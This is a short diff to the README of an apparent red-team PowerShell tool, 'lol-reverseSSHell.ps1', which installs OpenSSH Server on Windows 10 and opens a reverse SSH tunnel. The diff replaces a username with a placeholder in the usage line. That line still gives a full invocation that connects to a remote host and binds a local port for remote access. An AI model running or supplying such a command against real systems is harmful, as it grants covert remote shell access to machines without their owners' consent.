@@ -6,7 +6,7 @@ This script will install OpenSSH Server on Windows 10 via WindowsCapability. The
 * Please generate NEW SSH KEYs. Use the repo keys only for testing. 
 
 Usage: 
-* .\lol-reverseSSHell.ps1 -DestinationUserName aj -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 5555 -InstallOpenSSHServer yes Powershell prompt run ./LoL-ReverseSSHell.ps1
+* .\lol-reverseSSHell.ps1 -DestinationUserName `<User>` -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 5555 -InstallOpenSSHServer yes 
 * get-help .\lol-reverseSSHell.ps1 
 
 * get-help .\lol-reverseSSHell.ps1 -Examples
